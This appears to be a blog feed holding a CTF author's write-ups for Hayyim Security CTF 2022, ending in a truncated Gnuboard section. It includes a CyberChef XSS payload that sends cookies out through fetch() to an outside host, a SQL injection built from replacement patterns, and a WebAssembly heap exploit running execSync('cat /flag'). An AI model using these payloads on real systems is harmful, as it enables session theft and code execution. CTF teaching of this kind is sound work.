<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>POSIX</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.p6.is/"/>
  <updated>2022-10-14T13:04:25.645Z</updated>
  <id>https://blog.p6.is/</id>
  
  <author>
    <name>posix</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Writeups for Hayyim Security CTF 2022</title>
    <link href="https://blog.p6.is/writeups-for-hayyim-security-ctf-2022/"/>
    <id>https://blog.p6.is/writeups-for-hayyim-security-ctf-2022/</id>
    <published>2022-02-15T16:37:35.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cyberchef-Cyber-Headchef"><a href="#Cyberchef-Cyber-Headchef" class="headerlink" title="Cyberchef, Cyber Headchef"></a>Cyberchef, Cyber Headchef</h2><ul><li>Difficulty: <strong>★★★★★</strong></li><li>Solved: <strong>57 &#x2F; 541</strong>, <strong>22 &#x2F; 541</strong></li><li>Tag: <strong>XSS</strong>, <strong>Javascript</strong></li></ul><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p><code>Cyberchef</code> was the most solved challenge this overall CTF even though I thought this will be the hardest one in this CTF.<br>The reason was an unintended solution what I didn’t caughted from <a href="https://github.com/gchq/CyberChef/issues/1265">this github issue</a>.<br>So I published another challenged Cyber Headchef with prohibiting use of string “table” in the payload.</p><p>But my mitigation was not enough to prevent the unintended solution.<br>It worked again with a null byte insertion in the middle of the <code>table</code> string.<br>Since you can check the unintended XSS payload in the link above, That will not be discussed in here.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://gchq.github.io/CyberChef/#recipe=JPath_expression(&#x27;0&#x27;,&#x27;\n&#x27;)&amp;input=WzEzMzdd</span><br><span class="line">result : 1337</span><br></pre></td></tr></table></figure><p>Among the many of cyberchef functionalities<br>you can see there’s <code>JPath_expression</code> which does jsonpath query with given json string.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">evaluate</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123; <span class="keyword">return</span> _evaluate.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>) &#125;</span><br><span class="line">  <span class="keyword">catch</span> (e) &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="string">&#x27;subscript-child-filter_expression&#x27;</span>: <span class="keyword">function</span>(<span class="params">component, partial, count</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// slice out the expression from ?(expression)</span></span><br><span class="line">    <span class="keyword">var</span> src = component.<span class="property">expression</span>.<span class="property">value</span>.<span class="title function_">slice</span>(<span class="number">2</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">var</span> ast = aesprim.<span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> passable = <span class="keyword">function</span>(<span class="params">key, value</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> evaluate(ast, &#123; <span class="string">&#x27;@&#x27;</span>: value &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">descend</span>(partial, <span class="literal">null</span>, passable, count);</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="string">&#x27;subscript-descendant-filter_expression&#x27;</span>: <span class="keyword">function</span>(<span class="params">component, partial, count</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// slice out the expression from ?(expression)</span></span><br><span class="line">    <span class="keyword">var</span> src = component.<span class="property">expression</span>.<span class="property">value</span>.<span class="title function_">slice</span>(<span class="number">2</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">var</span> ast = aesprim.<span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> passable = <span class="keyword">function</span>(<span class="params">key, value</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> evaluate(ast, &#123; <span class="string">&#x27;@&#x27;</span>: value &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">traverse</span>(partial, <span class="literal">null</span>, passable, count);</span><br><span class="line">  &#125;,</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>The <a href="https://npmjs.com/package/jsonpath">jsonpath</a> module tries to evaluate the given script includes subscript expression with <code>static-eval</code>.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;MemberExpression&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> obj = <span class="title function_">walk</span>(node.<span class="property">object</span>);</span><br><span class="line">    <span class="comment">// do not allow access to methods on Function </span></span><br><span class="line">    <span class="keyword">if</span>((obj === <span class="variable constant_">FAIL</span>) || (<span class="keyword">typeof</span> obj == <span class="string">&#x27;function&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (node.<span class="property">property</span>.<span class="property">type</span> === <span class="string">&#x27;Identifier&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> obj[node.<span class="property">property</span>.<span class="property">name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> prop = <span class="title function_">walk</span>(node.<span class="property">property</span>);</span><br><span class="line">    <span class="keyword">if</span> (prop === <span class="variable constant_">FAIL</span>) <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    <span class="keyword">return</span> obj[prop];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>static-eval</code> tries to evaluate ast statement parsed by asprima.<br>They have restricted implementation for the expressions.<br>But there are MemberExpression, CallExpression, FunctionExpression and It’s pretty enough to mess up everything.</p><p>More than everything else, their implementaion for the MemberExpression has a obvious flaw.<br>The fourth line in the above snippet seems like to prevent from referencing constructor of javascript function.<br>But this can be easily bypassed with the statement below.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">__proto__</span>:[].<span class="property">constructor</span>&#125;;</span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">typeof</span> obj</span><br><span class="line"><span class="comment">// &#x27;object&#x27;</span></span><br><span class="line">obj.<span class="property">constructor</span></span><br><span class="line"><span class="comment">// ƒ Function() &#123; [native code] &#125;</span></span><br></pre></td></tr></table></figure><p>The object has a function in their <code>__proto__</code> attribute returns constructor of function when their constructor referenced even though its operated value with typeof operator returns <code>object</code>.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> parse = <span class="built_in">require</span>(<span class="string">&#x27;esprima&#x27;</span>).<span class="property">parse</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`(&#123;__proto__:[].constructor&#125;).constructor(&#x27;console.log(1337)&#x27;)()`</span>;</span><br><span class="line"><span class="keyword">var</span> ast = <span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"> </span><br><span class="line">evaluate(ast); <span class="comment">// This prints &quot;1337&quot;</span></span><br></pre></td></tr></table></figure><p>So this can be used to bypass restriction of static-eval.<br>And It leads to XSS vulnerability in Cyberchef application.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gchq.github.io/CyberChef/#recipe=JPath_expression(&#x27;$..%5B?((%7B__proto__:%5B%5D.constructor%7D).constructor(%22self.postMessage(%7Baction:%5C&#x27;bakeComplete%5C&#x27;,data:%7BbakeId:1,dish:%7Btype:1,value:%5C&#x27;%5C&#x27;%7D,duration:1,error:false,id:undefined,inputNum:2,progress:1,result:%5C&#x27;%3Ciframe/onload%3Dalert(1337)%3E%5C&#x27;,type:%20%5C&#x27;html%5C&#x27;%7D%7D);%22)();)%5D&#x27;,&#x27;%5C%5Cn&#x27;)&amp;input=W3t9XQ</span><br></pre></td></tr></table></figure><p>This is the payload. It gives the custom script to be evaluated to static-eval thought jsonpath.<br>and finally you can see It pops up <code>1337</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;http://cyberchef:8000/#recipe=JPath_expression(&#x27;$..%5B?((%7B__proto__:%5B%5D.constructor%7D).constructor(%22self.postMessage(%7Baction:%5C&#x27;bakeComplete%5C&#x27;,data:%7BbakeId:1,dish:%7Btype:1,value:%5C&#x27;%5C&#x27;%7D,duration:1,error:false,id:undefined,inputNum:2,progress:1,result:%5C&#x27;%3Ciframe/onload%3Dfetch(`http://p6.is/flag?$&#123;document.cookie&#125;`)%3E%5C&#x27;,type:%20%5C&#x27;html%5C&#x27;%7D%7D);%22)();)%5D&#x27;,&#x27;%5C%5Cn&#x27;)&amp;input=W3t9XQ&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://1.230.253.91:8001/report&#x27;</span>, data = &#123;</span><br><span class="line">    <span class="string">&#x27;url&#x27;</span>: payload</span><br><span class="line">&#125;, allow_redirects = <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>You could get the flag with this payload in the request from the selenium bot.</p><h2 id="Not-E"><a href="#Not-E" class="headerlink" title="Not E"></a>Not E</h2><ul><li>Difficulty: <strong>★</strong></li><li>Solved: <strong>38 &#x2F; 541</strong></li><li>Tag: <strong>Javascript</strong>, <strong>SQLi</strong></li></ul><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>Intended solution was using special replacement pattern of String.prototype.replace</p><table><thead><tr><th>Pattern</th><th>Inserts</th></tr></thead><tbody><tr><td>$$</td><td>Inserts a “$”.</td></tr><tr><td>$&amp;</td><td>Inserts the matched substring.</td></tr><tr><td>$&#96;</td><td>Inserts the portion of the string that precedes the matched substring.</td></tr><tr><td>$’</td><td>Inserts the portion of the string that follows the matched substring.</td></tr></tbody></table><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#<span class="title function_">formatQuery</span>(<span class="params">sql, params = []</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> param <span class="keyword">of</span> params) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> param === <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">            sql = sql.<span class="title function_">replace</span>(<span class="string">&#x27;?&#x27;</span>, param);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> param === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">            sql = sql.<span class="title function_">replace</span>(<span class="string">&#x27;?&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(param.<span class="title function_">replace</span>(<span class="regexp">/[&quot;\\]/g</span>, <span class="string">&#x27;&#x27;</span>)));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sql = sql.<span class="title function_">replace</span>(<span class="string">&#x27;?&#x27;</span>, <span class="string">&quot;&quot;</span>); <span class="comment">// unreachable</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sql;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>In the given source, Database class extends sqlite db has private method which does the role of query builder.<br>It builds the query with params from the array after stripping the double quotes and backslash from the array elements.<br>SInce JSON.stringify wraps the result string with double quotes, the replacing prevents sql injection from the param.</p><p>But you still make injection in here by inserting special replacement pattern <code>$&#39;</code> to the title of note. The steps are as follows.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># querystring</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> posts <span class="keyword">values</span> (?, ?, ?, ?)</span><br><span class="line"># noteId : &quot;60b725&quot;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> posts <span class="keyword">values</span> (&quot;60b725&quot;, ?, ?, ?)</span><br><span class="line"># title : &quot;$&#x27;&quot;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> posts <span class="keyword">values</span> (&quot;60b725&quot;, &quot;, ?, ?)&quot;, ?, ?)</span><br><span class="line"># content : &quot;, (select flag from flag), char(97))-- -&quot;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> posts <span class="keyword">values</span> (&quot;60b725&quot;, &quot;, &quot;, (<span class="keyword">select</span> flag <span class="keyword">from</span> flag), <span class="type">char</span>(<span class="number">117</span>)<span class="operator">||</span><span class="type">char</span>(<span class="number">115</span>)<span class="operator">||</span><span class="type">char</span>(<span class="number">101</span>)<span class="operator">||</span><span class="type">char</span>(<span class="number">114</span>))<span class="comment">-- -&quot;, ?)&quot;, ?, ?)</span></span><br><span class="line"># username : &quot;user&quot;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> posts <span class="keyword">values</span> (&quot;60b725&quot;, &quot;, &quot;, (<span class="keyword">select</span> flag <span class="keyword">from</span> flag), <span class="type">char</span>(<span class="number">117</span>)<span class="operator">||</span><span class="type">char</span>(<span class="number">115</span>)<span class="operator">||</span><span class="type">char</span>(<span class="number">101</span>)<span class="operator">||</span><span class="type">char</span>(<span class="number">114</span>))<span class="comment">-- -&quot;, &quot;user&quot;)&quot;, ?, ?)</span></span><br></pre></td></tr></table></figure><p>This query inserts the content of flag into the new note of the user named <code>user</code>.<br>So, you can check the flag from the note list.</p><h2 id="Wasmup"><a href="#Wasmup" class="headerlink" title="Wasmup"></a>Wasmup</h2><ul><li>Difficulty: <strong>★★</strong></li><li>Solved: <strong>4 &#x2F; 541</strong></li><li>Tag: <strong>WebAssembly</strong></li></ul><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>This challenge was inspired by <a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web-wp.pdf">this reference</a> presented in Defcon 2018 by NCCGroup.<br>In contrast to wasm is the popular topic from modern browsers.<br>It seems there are not many web challenges dealing wasm excepting the reversing aspects.<br>So I thought one challenge dealing wasm can be informative for all.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="built_in">printMenu</span>();</span><br><span class="line">    <span class="type">int</span> choice = <span class="built_in">readInt</span>(<span class="string">&quot;choice&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">createNote</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">editNote</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">deleteNote</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">emscripten_run_script</span>(<span class="string">&quot;process.exit(0);&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Its implementation is almost same with other basic heap challenges except that one part that exits the program.<br>When the user sends number <code>4</code> as input, it runs <code>emscripten_run_script</code> function with the string <code>process.exit(0);</code> which is actually javascript code to exit process.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_emscripten_run_script</span>(<span class="params">ptr</span>) &#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="title class_">UTF8ToString</span>(str));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> asmLibraryArg = &#123;</span><br><span class="line">  <span class="string">&quot;emscripten_memcpy_big&quot;</span>: _emscripten_memcpy_big,</span><br><span class="line">  <span class="string">&quot;emscripten_resize_heap&quot;</span>: _emscripten_resize_heap,</span><br><span class="line">  <span class="string">&quot;emscripten_run_script&quot;</span>: _emscripten_run_script,</span><br><span class="line">  <span class="string">&quot;fd_close&quot;</span>: _fd_close,</span><br><span class="line">  <span class="string">&quot;fd_read&quot;</span>: _fd_read,</span><br><span class="line">  <span class="string">&quot;fd_seek&quot;</span>: _fd_seek,</span><br><span class="line">  <span class="string">&quot;fd_write&quot;</span>: _fd_write,</span><br><span class="line">  <span class="string">&quot;setTempRet0&quot;</span>: _setTempRet0</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>The function <code>emscripten_run_script</code> just evaluate the string given as a parameter.<br>So you can execute any script If you overwrite the string <code>process.exit(0);</code> which is in somewhere of wasm memory.<br>In normal binaries complied with generic compiler like clang, gcc, It’s impossible to change these data because its section declared to read-only area. but In the case of wasm, the section is also writable since they does not distinguish bss&#x2F;ro&#x2F;rw sections.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;1.230.253.91&#x27;</span>, <span class="string">&#x27;2000&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">3</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">0x69</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x81</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0xc</span> + p32(<span class="number">0x69</span>) + p32(<span class="number">0x898</span> - <span class="number">0x10</span>) + p32(<span class="number">0</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">2</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">2</span>, p32(<span class="number">0x483</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x5c</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;console.log(require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;)+[]);process.exit(0);\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>So, above is the actual exploit for <code>Wasmup</code>.</p><p>createNote function has a flaw that changes the size of the specific note even though the invalid size has given.<br>By that flaw, you can overwrite note[0] to the address of <code>process.exit(0);</code></p><p>It prints flag by calling <code>emscripten_run_script</code> after manipulating data.</p><h2 id="Gnuboard"><a href="#Gnuboard" class="headerlink" title="Gnuboard"></a>Gnuboard</h2><ul><li>Difficulty: <strong>★★★</strong></li><li>Solved: <strong>4 &#x2F; 541</strong></li><li>Tag: <strong>PHP</strong></li></ul><h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>Gnuboard is one of most popular cms in SK used for non-commerial projects.<br>Few years ago, I used to report vuln of gnuboard but It seems how they adds new feature meh.<br>Inspired by many of their bugs, I decided to make a challenge from it.</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y wget curl apache2 git php-gd php-mysql php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://github.com/gnuboard/gnuboard5 /tmp/gnuboard</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -r /tmp/gnuboard/* /var/www/html</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/AllowOverride None/AllowOverride All/g&#x27;</span> /etc/apache2/apache2.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 777 data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -rf index.html /tmp/gnuboard</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;$flag = &quot;hsctf&#123;flag-will-be-here&#125;&quot;;&#x27;</span> &gt;&gt; /var/www/html/common.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> entrypoint.sh /</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /entrypoint.sh</span></span><br></pre></td></tr></table></figure><p>You can see it saves the flag at common.php as a variable in the given dockerfile.<br>So It requires you to find vulnerability can print specific variable or execute command or prints the content of common.php. the intended solution was the first.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 